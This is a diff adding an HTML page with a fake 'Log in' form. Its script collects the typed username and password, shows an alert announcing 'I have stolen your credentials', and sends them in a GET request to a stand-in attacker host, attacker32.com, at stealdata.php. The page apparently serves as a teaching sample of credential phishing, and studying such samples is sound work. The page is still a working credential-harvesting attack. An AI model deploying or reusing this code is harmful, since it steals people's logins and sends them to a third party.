@@ -1,0 +1,48 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+<title></title>
+</head>
+
+<body>
+
+<b id="text1">Username or email</b>
+<input id="username" type="text" 
+       style="width:500px; height:30px;">
+
+<b id="text2">Password</b>
+<input id="password" type="password" 
+       style="width:500px; height:30px;">
+
+<button id="button" onclick="login()"
+	style="width:100px; height:30px">Log in</button>
+
+<script>
+  function login() {
+     username = document.getElementById("username").value
+     password = document.getElementById("password").value
+     credentials = "username="+username + "&password="+password
+     alert("I have stolen your credentials: " + credentials);
+     const xhttp = new XMLHttpRequest();
+     const url='http://www.attacker32.com/attack/stealdata.php?' + credentials;
+     xhttp.open("GET", url, true);
+     xhttp.send();
+  }
+</script>
+
+<style type="text/css">
+  body { background-color: white; }
+  #text1     {position:absolute; top:00px;  left:20px;}
+  #username  {position:absolute; top:30px;  left:20px;}
+  #text2     {position:absolute; top:100px; left:20px;}
+  #password  {position:absolute; top:130px; left:20px;}
+  #button    {position:absolute; top:180px; left:440px;
+              background-color: #008CBA; 
+	      font-size: 16px; color: white;
+	      border-radius: 4px;
+  }
+</style>
+
+</body>
+</html>
+
